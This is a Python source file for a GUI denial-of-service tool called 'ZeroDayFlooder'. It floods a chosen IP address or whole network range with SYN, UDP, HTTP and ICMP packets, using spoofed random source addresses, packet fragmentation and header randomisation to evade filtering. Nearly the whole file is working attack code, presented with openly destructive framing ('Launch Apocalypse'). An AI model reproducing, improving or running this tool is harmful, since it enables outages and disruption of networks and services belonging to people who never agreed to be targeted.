
import tkinter as tk
from tkinter import messagebox
import scapy.all as scapy
from PIL import Image, ImageTk
import threading
import logging
import ipaddress
import time
import random
import string
import socket
import os
import uuid
import hashlib
from concurrent.futures import ThreadPoolExecutor
import queue
import psutil

# Logging for max tracking
logging.basicConfig(filename='zerodayflooder_elite.log', level=logging.DEBUG, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Global chaos control
stop_event = threading.Event()
MAX_THREADS = 5000  # Max threads
MAX_RATE = 1000000  # Max packets/sec
MAX_PAYLOAD = 65535  # Max payload size
TASK_QUEUE = queue.Queue()  # Task queue for thread pooling

class ZeroDayFlooder:
    def __init__(self, root):
        self.root = root
        self.root.title("ZeroDayFlooder - Kira's Ultimate Wrath")
        self.root.geometry("800x800")
        
        # GUI for total domination
        self.ip_label = tk.Label(root, text="Target IP or Range (CIDR):", font=("Arial", 12))
        self.ip_label.pack(pady=5)
        self.ip_entry = tk.Entry(root, width=30)
        self.ip_entry.pack(pady=5)
        
        self.port_label = tk.Label(root, text="Port (0 for random, comma-separated):", font=("Arial", 12))
        self.port_label.pack(pady=5)
        self.port_entry = tk.Entry(root, width=30)
        self.port_entry.pack(pady=5)
        
        self.threads_label = tk.Label(root, text=f"Thread Count (1-{MAX_THREADS}):", font=("Arial", 12))
        self.threads_label.pack(pady=5)
        self.threads_entry = tk.Entry(root, width=10)
        self.threads_entry.pack(pady=5)
        
        self.rate_label = tk.Label(root, text=f"Flood Rate (1-{MAX_RATE} pkt/s):", font=("Arial", 12))
        self.rate_label.pack(pady=5)
        self.rate_entry = tk.Entry(root, width=10)
        self.rate_entry.pack(pady=5)
        
        self.payload_label = tk.Label(root, text=f"Payload Size (1-{MAX_PAYLOAD} bytes):", font=("Arial", 12))
        self.payload_label.pack(pady=5)
        self.payload_entry = tk.Entry(root, width=10)
        self.payload_entry.pack(pady=5)
        
        # Attack types with ICMP
        self.syn_var = tk.BooleanVar()
        self.udp_var = tk.BooleanVar()
        self.http_var = tk.BooleanVar()
        self.icmp_var = tk.BooleanVar()
        tk.Checkbutton(root, text="SYN Flood", variable=self.syn_var, font=("Arial", 10)).pack(pady=2)
        tk.Checkbutton(root, text="UDP Blast", variable=self.udp_var, font=("Arial", 10)).pack(pady=2)
        tk.Checkbutton(root, text="HTTP Bomb", variable=self.http_var, font=("Arial", 10)).pack(pady=2)
        tk.Checkbutton(root, text="ICMP Storm", variable=self.icmp_var, font=("Arial", 10)).pack(pady=2)
        
        # Advanced options
        self.random_port_var = tk.BooleanVar()
        self.random_ip_var = tk.BooleanVar()
        self.fragment_var = tk.BooleanVar()  # New: IP fragmentation toggle
        tk.Checkbutton(root, text="Random Port Scan", variable=self.random_port_var, font=("Arial", 10)).pack(pady=2)
        tk.Checkbutton(root, text="Random Source IP", variable=self.random_ip_var, font=("Arial", 10)).pack(pady=2)
        tk.Checkbutton(root, text="Enable IP Fragmentation", variable=self.fragment_var, font=("Arial", 10)).pack(pady=2)
        
        self.status_bar = tk.Label(root, text="Ready to unleash hell!", bd=1, relief=tk.SUNKEN, anchor=tk.W, font=("Arial", 10))
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        self.start_button = tk.Button(root, text="Launch Apocalypse", command=self.start_flood, bg="red", fg="white", font=("Arial", 12))
        self.start_button.pack(pady=10)
        
        self.stop_button = tk.Button(root, text="Cease Destruction", command=self.stop_flood, state=tk.DISABLED, bg="black", fg="white", font=("Arial", 12))
        self.stop_button.pack(pady=10)
        
        self.image_label = tk.Label(root)
        self.image_label.pack(pady=10)
        self.load_kira_image()
        
        self.threads = []
        self.executor = ThreadPoolExecutor(max_workers=self.optimize_thread_count())
    
    def optimize_thread_count(self):
        # Dynamically adjust thread count based on CPU and memory
        cpu_count = psutil.cpu_count()
        mem = psutil.virtual_memory()
        mem_available = mem.available / (1024 ** 2)  # MB
        # Use 75% of CPU cores or scale based on memory
        thread_count = min(int(cpu_count * 0.75), MAX_THREADS)
        if mem_available < 500:  # Low memory
            thread_count = max(1, thread_count // 2)
        logging.debug(f"Optimized thread count: {thread_count}")
        return thread_count
    
    def load_kira_image(self):
        try:
            img = Image.open("kira_laugh.png")
            img = img.resize((200, 200), Image.LANCZOS)
            self.kira_img = ImageTk.PhotoImage(img)
            self.image_label.config(image=self.kira_img)
            self.status_bar.config(text="Kira's wrath loaded!")
        except Exception as e:
            logging.error(f"Image load failed: {str(e)}")
            self.image_label.config(text="KIRA LAUGH [NO IMG]", font=("Arial", 20), fg="red")
            self.status_bar.config(text="Image load failed, Kira still laughing!")
    
    def validate_ip(self, ip):
        try:
            ipaddress.ip_network(ip, strict=False)
            return True
        except ValueError as e:
            logging.error(f"Invalid IP/CIDR: {ip} - {str(e)}")
            messagebox.showerror("Error", f"Invalid IP/CIDR: {ip}")
            return False
    
    def generate_random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    
    def generate_random_mac(self):
        mac = [random.randint(0x00, 0xff) for _ in range(6)]
        return ":".join(f"{x:02x}" for x in mac)
    
    def check_network(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return True
        except (socket.error, PermissionError, OSError) as e:
            logging.error(f"Network check failed: {str(e)}")
            messagebox.showerror("Error", "Network error: Need root or check interface!")
            return False
    
    def worker(self):
        # Worker thread to process tasks from queue
        while not stop_event.is_set():
            try:
                task, ip, port, rate, payload_size = TASK_QUEUE.get_nowait()
                task(ip, port, rate, payload_size)
            except queue.Empty:
                time.sleep(0.01)  # Prevent CPU spin
            except Exception as e:
                logging.error(f"Worker error: {str(e)}")
    
    def craft_enhanced_packet(self, base_pkt, fragment=False):
        # Enhanced packet crafting: mutate headers, add options, fragment if enabled
        base_pkt.id = random.randint(1, 65535)
        base_pkt.ttl = random.randint(32, 255)
        base_pkt.flags = random.choice(['DF', 'MF', ''])  # Random flags
        if hasattr(base_pkt, 'TCP'):
            base_pkt[TCP].options = [('MSS', random.randint(500, 1500)), ('NOP', None), ('Timestamp', (random.randint(0, 2**32-1), 0))]
            base_pkt[TCP].window = random.randint(1024, 65535)
            base_pkt[TCP].seq = random.randint(0, 2**32-1)
            base_pkt[TCP].ack = random.randint(0, 2**32-1) if 'A' in base_pkt[TCP].flags else 0
        elif hasattr(base_pkt, 'UDP'):
            base_pkt[UDP].len = len(base_pkt[UDP])
        if fragment and random.random() > 0.5:  # Randomly fragment
            frags = scapy.fragment(base_pkt, fragsize=random.randint(100, 1400))
            return frags
        return [base_pkt]
    
    def syn_flood(self, ip, port, rate, _):
        try:
            delay = 1.0 / max(1, rate)
            src_ip = self.generate_random_ip() if self.random_ip_var.get() else "192.168.0.1"
            base_pkt = scapy.IP(src=src_ip, dst=ip) / scapy.TCP(dport=port, sport=random.randint(1024, 65535), flags="S")
            while not stop_event.is_set():
                pkts = self.craft_enhanced_packet(base_pkt, self.fragment_var.get())
                for pkt in pkts:
                    scapy.send(pkt, verbose=False)
                time.sleep(delay)
        except Exception as e:
            logging.error(f"SYN flood error: {str(e)}")
            self.status_bar.config(text="SYN flood crashed!")
    
    def udp_blast(self, ip, port, rate, payload_size):
        try:
            delay = 1.0 / max(1, rate)
            payload = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:payload_size].encode()
            src_ip = self.generate_random_ip() if self.random_ip_var.get() else "192.168.0.1"
            base_pkt = scapy.IP(src=src_ip, dst=ip) / scapy.UDP(dport=port, sport=random.randint(1024, 65535)) / payload
            while not stop_event.is_set():
                pkts = self.craft_enhanced_packet(base_pkt, self.fragment_var.get())
                for pkt in pkts:
                    scapy.send(pkt, verbose=False)
                time.sleep(delay)
        except Exception as e:
            logging.error(f"UDP blast error: {str(e)}")
            self.status_bar.config(text="UDP blast crashed!")
    
    def http_bomb(self, ip, port, rate, payload_size):
        try:
            delay = 1.0 / max(1, rate)
            headers = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: KiraBot/{random.randint(1,1000)}\r\n" + \
                      f"Accept: */*\r\nConnection: keep-alive\r\n{'A' * (payload_size - 150)}\r\n\r\n"
            payload = headers.encode()
            src_ip = self.generate_random_ip() if self.random_ip_var.get() else "192.168.0.1"
            base_pkt = scapy.IP(src=src_ip, dst=ip) / scapy.TCP(dport=port, sport=random.randint(1024, 65535), flags="PA") / payload
            while not stop_event.is_set():
                pkts = self.craft_enhanced_packet(base_pkt, self.fragment_var.get())
                for pkt in pkts:
                    scapy.send(pkt, verbose=False)
                time.sleep(delay)
        except Exception as e:
            logging.error(f"HTTP bomb error: {str(e)}")
            self.status_bar.config(text="HTTP bomb crashed!")
    
    def icmp_storm(self, ip, port, rate, _):
        try:
            delay = 1.0 / max(1, rate)
            src_ip = self.generate_random_ip() if self.random_ip_var.get() else "192.168.0.1"
            base_pkt = scapy.IP(src=src_ip, dst=ip) / scapy.ICMP(type=random.choice([0, 8, 13, 15, 17]), code=random.randint(0, 255)) / (b'\x00' * random.randint(100, 1000))
            while not stop_event.is_set():
                pkts = self.craft_enhanced_packet(base_pkt, self.fragment_var.get())
                for pkt in pkts:
                    scapy.send(pkt, verbose=False)
                time.sleep(delay)
        except Exception as e:
            logging.error(f"ICMP storm error: {str(e)}")
            self.status_bar.config(text="ICMP storm crashed!")
    
    def start_flood(self):
        ip_input = self.ip_entry.get()
        try:
            ports = [int(p) for p in self.port_entry.get().split(",") if p.strip()] or [0]
            threads = int(self.threads_entry.get() or 1)
            rate = int(self.rate_entry.get() or 1000)
            payload_size = int(self.payload_entry.get() or 1000)
            
            if any(p < 0 or p > 65535 for p in ports if p != 0):
                raise ValueError("Ports must be 0-65535 or 0 for random!")
            if threads < 1 or threads > MAX_THREADS:
                raise ValueError(f"Threads must be 1-{MAX_THREADS}!")
            if rate < 1 or rate > MAX_RATE:
                raise ValueError(f"Rate must be 1-{MAX_RATE} packets/sec!")
            if payload_size < 1 or payload_size > MAX_PAYLOAD:
                raise ValueError(f"Payload size must be 1-{MAX_PAYLOAD} bytes!")
        except ValueError as e:
            logging.error(f"Input validation failed: {str(e)}")
            messagebox.showerror("Error", f"Invalid input: {str(e)}")
            return
        
        try:
            ip_network = ipaddress.ip_network(ip_input, strict=False)
            ip_list = [str(ip) for ip in ip_network]
        except ValueError as e:
            logging.error(f"IP range error: {str(e)}")
            messagebox.showerror("Error", f"Invalid IP range: {str(e)}")
            return
        
        if not (self.syn_var.get() or self.udp_var.get() or self.http_var.get() or self.icmp_var.get()):
            messagebox.showerror("Error", "Select at least one attack type!")
            return
        
        if not self.check_network():
            return
        
        stop_event.clear()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.status_bar.config(text=f"Unleashing chaos on {ip_input} with {threads} threads at {rate} pkt/s!")
        
        # Optimize thread usage with task queue
        attacks = []
        if self.syn_var.get():
            attacks.append(lambda ip, port, rate, payload_size: self.syn_flood(ip, port, rate, payload_size))
        if self.udp_var.get():
            attacks.append(lambda ip, port, rate, payload_size: self.udp_blast(ip, port, rate, payload_size))
        if self.http_var.get():
            attacks.append(lambda ip, port, rate, payload_size: self.http_bomb(ip, port, rate, payload_size))
        if self.icmp_var.get():
            attacks.append(lambda ip, port, rate, payload_size: self.icmp_storm(ip, port, rate, payload_size))
        
        try:
            # Pre-queue tasks for efficient thread utilization
            for ip in ip_list:
                for port in ports:
                    for attack in attacks:
                        for _ in range(threads):
                            TASK_QUEUE.put((attack, ip, port if port != 0 else random.randint(1, 65535), rate, payload_size))
            
            # Start worker threads
            for _ in range(self.optimize_thread_count()):
                t = threading.Thread(target=self.worker)
                t.start()
                self.threads.append(t)
        except Exception as e:
            logging.error(f"Attack launch failed: {str(e)}")
            messagebox.showerror("Error", "Failed to launch attack!")
            self.stop_flood()
    
    def stop_flood(self):
        try:
            stop_event.set()
            self.executor.shutdown(wait=True, timeout=10)
            self.executor = ThreadPoolExecutor(max_workers=self.optimize_thread_count())
            for t in self.threads:
                t.join(timeout=5)
            self.threads = []
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.status_bar.config(text="Chaos halted... for now!")
        except Exception as e:
            logging.error(f"Stop flood error: {str(e)}")
            self.status_bar.config(text="Error stopping chaos!")

if __name__ == "__main__":
    try:
        root = tk.Tk()
        app = ZeroDayFlooder(root)
        root.mainloop()
    except Exception as e:
        logging.critical(f"App crashed: {str(e)}")
        messagebox.showerror("Crash", "Kira's wrath failed to launch!")
